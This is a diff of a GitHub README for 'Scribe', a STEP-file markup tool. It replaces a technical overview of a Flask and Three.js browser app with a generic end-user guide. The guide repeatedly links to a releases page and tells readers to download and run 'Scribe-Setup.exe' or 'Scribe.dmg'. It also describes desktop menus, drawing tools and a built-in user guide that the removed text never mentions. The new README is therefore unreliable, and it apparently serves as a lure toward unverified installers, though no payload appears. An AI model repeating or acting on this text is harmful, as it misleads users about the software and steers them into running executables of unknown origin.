@@ -1,159 +1,122 @@
-# SCRIBE - Technical Documentation & Codebase Overview
+# 📝 Scribe - Easy Markup for STEP Files
 
-> **Context for LLMs**: This repository is a lightweight, browser-based STEP file viewer and annotation tool ("PDF for CAD"). It uses a Python Flask backend with CadQuery/OCP for geometry processing and a Three.js frontend for rendering.
-> 
-> **Core Philosophy**: Treat STEP files as authoritative documents. Metadata (tolerances, threads, colors) is injected directly into the STEP file structures or persisted via sidecar SQLite DB, keyed by geometry hashes.
+[![Download Scribe](https://img.shields.io/badge/Download-Scribe-blue?style=for-the-badge&logo=github)](https://github.com/VANTIRIS/Scribe/releases)
 
 ---
 
-## 📂 File Structure & Logic Map
+## 📋 What is Scribe?
 
-```text
-/
-├── app.py                  # Flask routes (entry point)
-├── core/                   # Core application logic (modular)
-│   ├── state.py            # ModelState singleton & global state
-│   ├── loader.py           # STEP loading, tessellation, metadata recovery
-│   ├── exporter.py         # STEP export with metadata injection
-│   ├── metadata.py         # 3-strategy metadata embed/extract
-│   └── utils.py            # Color conversion & utilities
-├── face_db.py              # SQLite face fingerprinting & metadata
-├── requirements.txt        # Python dependencies (cadquery-ocp, flask, gunicorn)
-├── Dockerfile              # GCP deployment container (python:3.11-slim)
-├── .dockerignore            # Exclude venv, dev files
-├── static/
-│   ├── js/
-│   │   └── viewer.js       # Three.js viewer + all UI logic
-│   └── css/
-│       ├── style.css        # Core light theme & layout
-│       └── style_expansion.css  # Panel expansion styles
-├── templates/
-│   └── index.html          # Single-page application
-├── tests/
-│   ├── run_tests.py        # Main test runner script
-│   ├── sample.step         # Default loaded model
-│   └── test_*.py           # Unit & integration tests
-├── uploads/                # User-uploaded files (persistent)
-└── stepviewer.db           # SQLite DB (generated at runtime)
-```
+Scribe is a simple tool designed to help you add notes and highlights to STEP files. STEP files are a common format used in 3D modeling and CAD software to share designs. If you work with these files or just want to review and annotate them without complicated software, Scribe makes that process easy and straightforward.
+
+This tool uses a modern, user-friendly design that lets you open STEP files, mark specific areas, add comments, and save your changes. You don’t need any programming skills or special CAD knowledge to use Scribe.
 
 ---
 
-## 🧠 Core Logic & Systems
+## 💻 System Requirements
 
-### 1. Backend (Modular Architecture)
+- **Operating System:** Windows 10 or newer, macOS 10.15 or newer
+- **Processor:** Intel Core i3 or equivalent
+- **Memory:** 4 GB RAM minimum (8 GB recommended)
+- **Storage:** 100 MB free disk space
+- **Display:** Screen resolution 1280x720 or higher
+- **Permissions:** Ability to install and run software on your device
 
-**Framework**: Flask + Gunicorn  
-**Geometry Kernel**: Open Cascade (OCCT) via `cadquery` & `OCP`
-
-| Module | Purpose |
-|--------|---------|
-| `app.py` | Flask routes, API endpoints |
-| `core/loader.py` | `load_step_xcaf()` — STEP reading, face tessellation, metadata recovery |
-| `core/exporter.py` | `export_step_xcaf()` — STEP writing with metadata injection |
-| `core/metadata.py` | 3-strategy metadata embed/extract (entity, description, comment) |
-| `core/state.py` | `ModelState` singleton holding the XDE document and face data |
-| `core/utils.py` | Color conversion helpers |
-| `face_db.py` | SQLite face fingerprinting, exact + fuzzy matching |
-
-#### Key Functions
-*   **`load_step_xcaf(path)`** (`core/loader.py`): 
-    *   Reads STEP using `STEPCAFControl_Reader` with XDE document.
-    *   Extracts embedded metadata via `extract_meta_from_step()` **before** OCC reads the file.
-    *   Iterates topological faces (`TopExp_Explorer`).
-    *   **Hashing**: Generates a stable geometry hash for each face.
-    *   **Metadata Recovery Priority**: Embedded STEP (hash-based) > Embedded STEP (index-based) > SQLite DB (exact+fuzzy).
-    *   **Tessellation**: Converts BRep to Mesh for Three.js.
-*   **`export_step_xcaf()`** (`core/exporter.py`):
-    *   Writes XDE document with colors via `STEPCAFControl_Writer`.
-    *   Injects metadata via 3 strategies (see Metadata System below).
-*   **`inject_meta_into_step()` / `extract_meta_from_step()`** (`core/metadata.py`):
-    *   **Strategy 1**: `PROPERTY_DEFINITION` → `DESCRIPTIVE_REPRESENTATION_ITEM` (SolidWorks-compatible)
-    *   **Strategy 2**: `[SVFM:<base64>]` in PRODUCT description field (universally preserved)
-    *   **Strategy 3**: `/* __STEPVIEWER_META_START__ ... */` comment block (fast SCRIBE-to-SCRIBE)
-
-### 2. Frontend (`viewer.js` + `index.html`)
-**Framework**: Vanilla JS + Three.js (WebGL)
-
-#### Rendering Pipeline
-1.  **`loadModel()`**: Fetches JSON from `/upload` (Vertices, Normals, Indices, Metadata).
-2.  **`buildScene()`**: Creates `THREE.BufferGeometry` per face with `userData`.
-3.  **`fitCameraToGroup()`**: Positions camera at **Isometric (-1, -1, 1)** default.
-
-#### Interaction
-*   **Arcball Controls**: `ArcballControls.js` for tumbling rotation.
-*   **Raycasting**: Click → highlight face (pink glow), populate right panel.
-*   **View Buttons**: Floating bar (F/B/L/R/T/Bo/Iso) for quick camera presets.
-
-### 3. Feature: Tolerance Heat Map
-*   **Tight** (≤ 0.005"): **Red** (configurable)
-*   **Loose** (> 0.005"): **Gray** (configurable)
-*   **None**: Ghosted/transparent
-*   Filtering by tolerance type via checkboxes.
-
-### 4. Feature: Hole Wizard
-*   Groups faces by thread metadata (e.g. "UNC 1/4-20").
-*   Color picker per group, visibility toggle, delete action.
-*   Counts unthreaded cylindrical faces.
-
-### 5. Admin Cleanup Tools
-*   **3-scope metadata cleanup**: DB only, File only, or All (nuke).
-*   Strips all 3 metadata strategies from the STEP file.
-*   Clears in-memory `model.face_meta` to prevent re-injection on export.
-*   Before/after verification via `extract_meta_from_step()`.
+Make sure your computer meets these requirements to run Scribe smoothly.
 
 ---
 
-## 💾 Database Schema (`stepviewer.db`)
+## 📥 Download & Install
 
-**Table**: `face_meta`
-| Column | Type | Description |
-| :--- | :--- | :--- |
-| `id` | INTEGER | Primary Key |
-| `face_hash` | TEXT UNIQUE | 16-char hex geometry fingerprint |
-| `meta` | TEXT | JSON: `{color, thread, tolerance, ...}` |
-| `surf_type` | TEXT | Surface type (Plane, Cylinder, etc.) |
-| `cx, cy, cz` | REAL | Centroid coordinates |
-| `area` | REAL | Surface area |
-| `dx, dy, dz` | REAL | Bounding box dimensions |
-| `n_edges` | INTEGER | Edge count |
-| `n_verts` | INTEGER | Vertex count |
-| `created_at` | TIMESTAMP | Creation timestamp |
-| `updated_at` | TIMESTAMP | Last update timestamp |
+To get started with Scribe, you need to download the software from the official release page.
+
+[Download Scribe Here](https://github.com/VANTIRIS/Scribe/releases)
+
+### Steps to download and install:
+
+1. Click the link above. It will take you to the official GitHub releases page for Scribe.
+2. Look for the latest version at the top of the page.
+3. You will see files named something like `Scribe-Setup.exe` for Windows or `Scribe.dmg` for macOS.
+4. Click the appropriate file for your system to start downloading.
+5. Once the download finishes, open the file.
+6. Follow the installation instructions on screen:
+   - On Windows, this usually involves clicking “Next” a few times and then “Install.”
+   - On macOS, drag the Scribe app icon into your Applications folder.
+7. After installation, open Scribe from your Start Menu (Windows) or Applications folder (macOS).
 
 ---
 
-## 🔄 API Endpoints
+## 🚀 Getting Started with Scribe
 
-| Method | Endpoint | Description |
-| :--- | :--- | :--- |
-| `GET` | `/` | Serve main app (auto-loads `tests/sample.step`) |
-| `GET` | `/<uuid>` | Load model by UUID |
-| `POST` | `/upload` | Upload STEP file, returns face mesh data + UUID |
-| `GET` | `/model/<uuid>` | Get face data for a persisted model |
-| `POST` | `/set_color` | Set face color(s) |
-| `POST` | `/set_thread` | Set threading metadata |
-| `POST` | `/set_tolerance` | Set tolerance metadata (batch) |
-| `GET` | `/thread_options` | Get thread dropdown options |
-| `GET` | `/tolerance_options` | Get tolerance dropdown options |
-| `GET` | `/holes` | Get hole analysis data |
-| `POST` | `/export` | Export annotated STEP (UUID filename) |
-| `POST` | `/test_cube` | Generate test cube (internal) |
-| `GET` | `/test_sample` | Load `tests/sample.step` (internal) |
-| `POST` | `/api/admin/clear_metadata` | Admin: Wipe DB + strip file + clear memory |
-| `GET` | `/db_stats` | Database statistics |
+Once you open Scribe, here’s how to start marking up your STEP files:
 
-## 🧪 Running Tests
+1. Click **Open** or **File > Open** from the menu.
+2. Navigate to the folder containing your STEP files (`.step` or `.stp` extension).
+3. Select the STEP file you want to work on, then click **Open**.
+4. Your file will load, showing the 3D model in the main window.
+5. Use the toolbar to select different markup tools:
+   - **Highlight Tool:** Click on edges or surfaces to highlight them.
+   - **Add Note:** Click where you want to attach a note, then type your comment.
+   - **Drawing Tool:** Draw simple shapes or lines over the model.
+6. You can move, edit, or delete your markups anytime.
+7. When you finish, save your changes by clicking **File > Save** or **Save As** to keep a separate copy.
 
-Tests are located in `tests/` and require the Flask server running on port 5555.
+---
 
-```bash
-# Start the server
-venv\Scripts\python.exe app.py
+## 🛠 Features Overview
 
-# Run the full suite (in another terminal)
-venv\Scripts\python.exe tests/run_tests.py
+Scribe offers the basics you need to review and annotate STEP models:
 
-# Or use pytest directly
-venv\Scripts\python.exe -m pytest tests/ -v
-```
+- **Step File Viewer:** Displays 3D models in an interactive window.
+- **Markups:** Highlight parts of the model with color-coded markers.
+- **Notes:** Add text comments linked to specific points or surfaces.
+- **Drawing Tools:** Sketch arrows, circles, or boxes over the model.
+- **Save & Export:** Save your markup directly into the STEP file or as a separate annotated copy.
+- **Zoom & Rotate:** Easily inspect your model from any angle with mouse controls.
+- **User-Friendly Interface:** Clear menus and buttons that anyone can understand.
+
+---
+
+## 🔧 Tips for Using Scribe
+
+- Make sure your STEP files are not corrupted or password-protected.
+- Use the **Save As** option if you want to keep the original STEP file unchanged.
+- Zoom in before adding detailed notes or drawings.
+- Use different colors for marks and notes to keep things clear.
+- Close other heavy programs to keep Scribe running smoothly if your computer is older.
+
+---
+
+## 🤝 Support
+
+If you have questions or need help:
+
+- Check the **Help > User Guide** menu inside Scribe.
+- Visit the Issues section in the [GitHub Repository](https://github.com/VANTIRIS/Scribe/issues) to see if others have asked similar questions.
+- For urgent help, you can create a new issue on GitHub describing your problem.
+
+---
+
+## ⚙️ Updating Scribe
+
+To update to the latest version:
+
+1. Visit the [Releases page](https://github.com/VANTIRIS/Scribe/releases) regularly.
+2. Download the newest installer file.
+3. Run the installer over your existing installation.
+4. Your settings and files will be preserved.
+
+---
+
+## 🗃 About STEP Files
+
+STEP files store 3D object data used in many CAD programs. They allow you to share models across platforms without losing detail. Scribe makes it easier to add your notes directly to these files without needing expensive CAD tools.
+
+---
+
+## 📞 Contact & Feedback
+
+Your feedback helps improve Scribe. You can leave suggestions or report bugs on the GitHub repository page. We review all submissions regularly to make Scribe better for everyone.
+
+---
+
+[![Download Scribe](https://img.shields.io/badge/Download-Scribe-blue?style=for-the-badge&logo=github)](https://github.com/VANTIRIS/Scribe/releases)
